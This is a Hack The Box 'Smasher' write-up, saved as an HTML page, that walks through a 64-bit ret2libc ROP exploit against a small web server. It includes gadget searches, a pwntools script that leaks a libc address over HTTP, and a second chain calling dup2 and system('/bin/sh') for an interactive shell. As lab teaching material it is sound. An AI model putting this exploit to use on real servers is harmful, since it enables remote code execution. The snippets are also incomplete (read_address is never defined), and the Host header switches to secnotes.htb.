<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Analysis and Exploitation Alt</title>
</head><body>https://epi052.gitlab.io/notes-to-self/blog/2018-10-02-hack-the-box-smasher/<br/>
<br/>
If you’re familiar with 32-bit binary exploitation, it may be surprising that we’re not targeting the instruction pointer, RIP (64-bit equivalent of EIP). We’re going to craft our exploit using Return-Oriented Programming (ROP). More specifically, we’re going to craft a ret2libc exploit.<br/>
<br/>
When using ROP, the goal is to use existing instructions within the binary to perform desirable actions. Those pieces of existing code are known as rop gadgets. Each rop gadget will terminate in a ret instruction. Each ret instruction moves program control to a return address located on the top of the stack. Since we can control what code is placed at the top of the stack with our PoC, we can chain multiple rop gadgets together, because each gadget will move program execution to the start of the next gadget. Essentially, the top of the stack takes the place of our instruction pointer.<br/>
<br/>
<br/>
<b>Ret2PLT: determining other addresses</b><br/>
Now that we know how many bytes it takes to reach the stack, we can start placing rop gadgets onto the stack to do our bidding. Our bidding in this case is to perform a Ret2PLT attack in order to leak a memory address from within libc. The question then becomes, which rop gadgets to we need? To answer that, we need to look at x86_64 bit calling conventions to understand the way forward.<br/>
<br/>
<b>x64 Assembly Calling Conventions</b><br/>
To pass parameters to a syscall, up to six registers may be used. They are shown below in the order in which they need to be populated. The syscall number itself is normally stored in rax, however we will just use the memory address of the syscall itself directly.<br/>
<br/>
rdi&#09;rsi&#09;rdx&#09;rcx&#09;r8&#09;r9<br/>
<br/>
To actually perform a syscall, we need to populate some of these registers with the arguments we want to pass to the syscall.<br/>
<br/>
The write Syscall<br/>
Having looked at calling conventions, let’s make a plan for what we need to put into the registers in order to make a successful call to write. Below, you can see the function definition of write and what we’ll attempt to put into rdi and rsi.<br/>
<br/>
<img src="image.png" /><br/>
<br/>
<br/>
<b>Locate write</b><br/>
To begin building our first ROP chain, we’ll get the address of the write syscall from the Procedure Linkage Table (PLT). The PLT is used to call external procedures/functions whose address isn’t known at the time of linking, and is left to be resolved by the dynamic linker at run time (recall that this binary is dynamically linked). The PLT is used in conjunction with the Global Offset Table (GOT) to implement dynamic linking. For more information on how dynamic libraries work in ELF files, please check out this <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">fantastic post</a>&nbsp;on the subject.<br/>
<br/>
objdump -D tiny | grep write<br/>
<br/>
objdump options used:<br/>
<br/>
&nbsp; &nbsp; -D, --disassemble-all<br/>
&nbsp; &nbsp; &nbsp; &nbsp; disassemble the contents of all sections, not just those expected to contain instructions.<br/>
The results of objdump show that the PLT address of write is 400c50.<br/>
<br/>
0000000000400c50 &lt;write@plt&gt;:<br/>
&nbsp; 400c50:&#09;ff 25 e2 23 20 00 &nbsp; &nbsp;&#09;jmpq &nbsp; *0x2023e2(%rip) &nbsp; &nbsp; &nbsp; &nbsp;# 603038 &lt;write@GLIBC_2.2.5&gt;<br/>
<br/>
write will be the first value we place onto the stack (this will eventually make it the furthest from the top of the stack after the other registers are setup).<br/>
<br/>
<br/>
<b>RDI Setup</b><br/>
We’ll start with finding a gadget for rdi. We’ll use the ropsearch command in peda to locate a gadget. The most direct gadget for getting a value into rdi is a pop rdi, so that’s what we’ll try for first.<br/>
<br/>
gdb -q tiny <br/>
<br/>
gdb-peda$ break main <br/>
gdb-peda$ run<br/>
gdb-peda$ peda ropsearch "pop rdi"<br/>
1<br/>
2<br/>
3<br/>
4<br/>
0x004011dd : (b'5fc3')&#09;pop rdi; ret<br/>
0x00401202 : (b'5fc3')&#09;pop rdi; ret<br/>
0x00401d36 : (b'5fc3')&#09;pop rdi; ret<br/>
0x00401ff3 : (b'5fc3')&#09;pop rdi; ret<br/>
<br/>
Success! A pop instruction loads the value from the top of the stack to the location specified and then increments the stack pointer. In our case, we’re specifying rdi as the destination. Simply put, we’ll use this gadget to grab the value at the top of the stack and store it in rdi. Any of the gadgets returned will work, we’ll just use the first one though.<br/>
<br/>
The value we want to pop from the stack into rdi is 0x4. When tiny is run locally, we see the message listen on port 9999, fd is 3 printed to the screen. fd in this case stands for file descriptor. Since we know that the server’s file descriptor at startup is 3, it’s a reasonable assumption that each request to the server increments the file descriptor by one.<br/>
<br/>
Taking rdi and 0x4 into account, our stack will look like this:<br/>
<br/>
TOP OF STACK<br/>
0x4011dd &#09;&#09;(pop rdi; ret)<br/>
0x4&#09;&#09;&#09;(fd to write to)<br/>
0x400c50&#09;&#09;(write address)<br/>
BOTTOM OF STACK<br/>
<br/>
<b>RSI Setup</b><br/>
Next up, we need to search for a gadget that will allow us to get a value into rsi.<br/>
<br/>
gdb-peda$ peda ropsearch "pop rsi"<br/>
Searching for ROP gadget: 'pop rsi' in: binary ranges<br/>
0x004011db : (b'5e415fc3')&#09;pop rsi; pop r15; ret<br/>
0x00401200 : (b'5e415fc3')&#09;pop rsi; pop r15; ret<br/>
-------------8&lt;-------------<br/>
<br/>
Success again! We have a pop rsi. The interesting piece here is that our gadget will pull two values off the stack. The first value will go into rsi, the other will to into r15. Luckily, we don’t care about r15 and can just jam some garbage in there.<br/>
<br/>
The value we want to load into rsi is the address of a syscall from the Global Offset Table (GOT). The Global Offset Table is a table of addresses stored in the data section of an ELF binary. It is used by the executed program to locate addresses that aren’t known at compile time (i.e. those that are dynamically linked). In our case we’ll use the read syscall from libc, whose address is located in the GOT, as our value for rsi.<br/>
<br/>
We can locate the address of read the same way we found write.<br/>
<br/>
objdump -D tiny | grep read<br/>
<br/>
0000000000400cf0 &lt;read@plt&gt;:<br/>
&nbsp; 400cf0:&#09;ff 25 92 23 20 00 &nbsp; &nbsp;&#09;jmpq &nbsp; *0x202392(%rip) &nbsp; &nbsp; &nbsp; &nbsp;# 603088 &lt;read@GLIBC_2.2.5&gt;<br/>
<br/>
With address in hand, we can take another look at our stack.<br/>
TOP OF STACK<br/>
0x4011db&#09;&#09;(pop rsi; pop r15; ret)<br/>
0x603088&#09;&#09;(read@GLIBC from GOT)<br/>
0xDEADBEEF&#09;(garbage for r15)<br/>
0x4011dd &#09;&#09;(pop rdi; ret)<br/>
0x4&#09;&#09;&#09;(fd to write to)<br/>
0x400c50&#09;&#09;(write address)<br/>
BOTTOM OF STACK<br/>
<br/>
<br/>
Memory Leak Payload<br/>
It’s time to go back to our PoC and alter the payload to hopefully see the memory address of read returned to us from tiny. However, instead of altering our original PoC, we’re going to use pwntools for the rest of the exploit. It has a lot of built-in functionality to make our lives easier.<br/>
=============================================================<br/>
import urllib<br/>
from pwn import * <br/>
<br/>
context.bits = 64<br/>
context.arch = 'amd64'<br/>
context.endian = 'little'<br/>
context.log_level = 'debug' &nbsp;# increase verbosity!<br/>
<br/>
host = '127.0.0.1'<br/>
port = 9999<br/>
<br/>
pop_rsi = p64(0x4011db)<br/>
read_got = p64(0x603088)<br/>
r15_junk = p64(0xdeadbeef)<br/>
pop_rdi = p64(0x4011dd)<br/>
file_descriptor = p64(0x4)<br/>
write_plt = p64(0x400c50)<br/>
<br/>
client = remote(host, port)<br/>
<br/>
# distance to the stack<br/>
payload = 'A' * 568<br/>
<br/>
# our ROP chain as discussed above<br/>
payload += pop_rsi<br/>
payload += read_got<br/>
payload += r15_junk<br/>
payload += pop_rdi<br/>
payload += file_descriptor<br/>
payload += write_plt<br/>
<br/>
url = """GET /{} HTTP/1.1\r\nHost: smasher.htb\r\n\r\n""".format(urllib.quote(payload))<br/>
<br/>
client.send(url)<br/>
<br/>
response = client.recvall()<br/>
=============================================================<br/>
There’s not a whole lot introduced in the script that hasn’t been discussed already. The p64() function is just converting our memory addresses into little-endian 64-bit values for use in our ROP chain.<br/>
<br/>
The other primay change is is that we’re using urllib.quote to encode our payload so that it plays nicely within the context of an HTTP request.<br/>
<br/>
<br/>
<b>Ret2libc</b><br/>
Now that we have an address into libc, the randomised (ASLR) libc base address can be calculated. Once we know what the base address is, the address of any function in libc can be calculated by its offset and used in our next ROP chain. We’ll leverage that to execute the system syscall, which is a part of libc. Additionally, for this ROP chain, we’re going to harness the power of pwntools to show how some of our earlier manual steps can be simplified.<br/>
<br/>
<br/>
<b>Calculate libc Base Address</b><br/>
Let’s begin by grabbing the target’s version of libc, since that is what the tiny web server on smasher will be using when we throw our exploit.<br/>
<br/>
wget http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so.6 -O targets-libc<br/>
<br/>
Now we can start piecing together what we need to get libc’s base address for use in calculating offsets. Let’s grab the address of read from within libc (not to be confused with the address of read from within tiny, which is what we just leaked above).<br/>
<br/>
readelf -s targets-libc | grep read<br/>
-------------8&lt;-------------<br/>
&nbsp; &nbsp;891: 00000000000f7250 &nbsp; &nbsp;90 FUNC &nbsp; &nbsp;WEAK &nbsp; DEFAULT &nbsp; 13 read@@GLIBC_2.2.5<br/>
readelf options used:<br/>
<br/>
&nbsp; &nbsp; -s, --symbols, --syms<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Displays the entries in symbol table section of the file, if it has one.<br/>
<br/>
We’ll use that address to calculate the base address of libc.<br/>
...<br/>
client.close() &nbsp;# tear down leak connection<br/>
<br/>
libc_read = 0x0f7250<br/>
<br/>
# gets offset that will be constant for all other libc functions<br/>
offset = read_address - libc_read <br/>
log.info("base libc address is: {}".format(hex(offset)))<br/>
...<br/>
<br/>
<b>Finding libc Functions</b><br/>
Next, we need to determine the address of a few functions we’re interested in as well as the string /bin/sh. As seen earlier, we’ll be using the target’s libc to find these addresses. First up, we’ll check out a manual way to get those addresses.<br/>
<br/>
-------------8&lt;-------------<br/>
readelf -s targets-libc | grep system<br/>
&nbsp; 1351: 0000000000045390 &nbsp; &nbsp;45 FUNC &nbsp; &nbsp;WEAK &nbsp; DEFAULT &nbsp; 13 system@@GLIBC_2.2.5<br/>
-------------8&lt;-------------<br/>
readelf -s targets-libc | grep dup2<br/>
&nbsp; &nbsp;962: 00000000000f7970 &nbsp; &nbsp;33 FUNC &nbsp; &nbsp;WEAK &nbsp; DEFAULT &nbsp; 13 dup2@@GLIBC_2.2.5<br/>
-------------8&lt;-------------<br/>
strings -t x targets-libc | grep /bin/sh<br/>
&nbsp; &nbsp;18cd57 /bin/sh<br/>
strings options used:<br/>
<br/>
&nbsp; &nbsp; -t radix<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Print the offset within the file before each string. &nbsp;The single character argument <br/>
&nbsp; &nbsp; &nbsp; &nbsp; specifies the radix of the offset <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o for octal<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x for hexadecimal <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; d for decimal<br/>
<br/>
We can get the same results with the following code using pwntools’ ELF class. However, in order to make the addresses usable, we need to update the libc variable’s base address to be that of our calculated offset. Doing this allows us to seamlessly use all of the addresses we pull out of the targets-libc later in our code.<br/>
<br/>
NOTE: Special thanks to the awesome @elkement are in order for pointing out that I forgot to include this small but crucial detail in the write-up!<br/>
<br/>
Having set the base address in the libc variable, future uses of the addresses will be equivalent to offset + address.<br/>
...<br/>
libc = ELF('./targets-libc')<br/>
<br/>
libc.address = offset<br/>
<br/>
libc_read = libc.sym.read &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # 0x0f7250<br/>
libc_system = libc.sym.system &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # 0x045390<br/>
libc_dup2 = libc.sym.dup2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # 0x0f7970<br/>
libc_binsh = next(libc.search("/bin/sh")) &nbsp; # 0x18cd57<br/>
...<br/>
<br/>
<br/>
<br/>
<b>ROP Chain #2</b><br/>
It’s time to build out another ROP chain. Here’s where the magic of pwntools really ramps up.<br/>
<br/>
Calling dup2<br/>
Executing /bin/sh won’t do us much good if our file descriptors don’t send and receive data. We can use dup2 to get our file descriptors situated.<br/>
<br/>
Here is the prototype for dup2. The dup2() system call creates a copy of the file descriptor oldfd using the file descriptor number specified in newfd as its target.<br/>
<br/>
int dup2(int oldfd, int newfd);<br/>
We’re going to lean on the pwntools ROP class and some of its methods to easily setup our dup2 calls.<br/>
<br/>
...<br/>
tiny = ELF('./tiny')<br/>
rop = ROP(tiny)<br/>
<br/>
rop.call(libc_dup2, [0x4, 0x0]) &nbsp;# STDIN<br/>
rop.call(libc_dup2, [0x4, 0x1]) &nbsp;# STDOUT<br/>
rop.call(libc_dup2, [0x4, 0x2]) &nbsp;# STDERR<br/>
...<br/>
<br/>
That’s it! A quote from the docs enlightens us a little bit as to what’s going on, but essentially, the act of setting up our own ROP chain is abstracted away. Each rop.call takes the function we want to call and the arguments we want to pass to that function.<br/>
<br/>
For amd64 binaries, the registers are loaded off the stack. Pwntools can do basic reasoning about simple “pop; pop; add; ret”-style gadgets, and satisfy requirements so that everything “just works”.<br/>
<br/>
<br/>
<b>Calling system</b><br/>
For reference, here is the system syscall prototype. The system() syscall uses fork to create a child process that executes the shell command specified in command using execl.<br/>
<br/>
int system(const char *command);<br/>
Let’s magic ourselves up the rest of our ROP chain.<br/>
<br/>
rop.call(libc_system, [libc_binsh])<br/>
<br/>
<b>Final Payload</b><br/>
To finish things out, we’ll use pwntools’ fit function. fit is inserting our final ROP chain at the offset 568, ezpz.<br/>
...<br/>
payload = fit({568: rop.chain()})<br/>
<br/>
url = """GET /{} HTTP/1.1\r\nHost: secnotes.htb\r\n\r\n""".format(urllib.quote(payload))<br/>
<br/>
client = remote(host, port)<br/>
client.send(url)<br/>
client.recvuntil("File not found")<br/>
client.interactive()<br/>
client.close()<br/>
...</body></html>